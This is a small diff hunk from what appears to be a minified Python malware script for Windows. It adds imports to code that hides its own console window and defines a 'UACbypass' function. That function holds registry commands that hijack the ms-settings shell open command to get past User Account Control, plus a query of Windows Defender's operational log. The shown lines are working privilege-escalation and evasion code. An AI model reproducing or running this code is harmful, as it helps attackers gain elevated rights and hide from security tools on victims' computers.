@@ -4,7 +4,7 @@ _D='file'
 _C='server'
 _B=False
 _A=True
-import subprocess,ctypes,sys,base64,ctypes
+import subprocess,ctypes,sys,base64,os,shutil,ctypes
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)
 def UACbypass(method=1):
 	G='reg delete hkcu\\Software\\Classes\\ms-settings /f';F='reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f';C='wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text';B=method
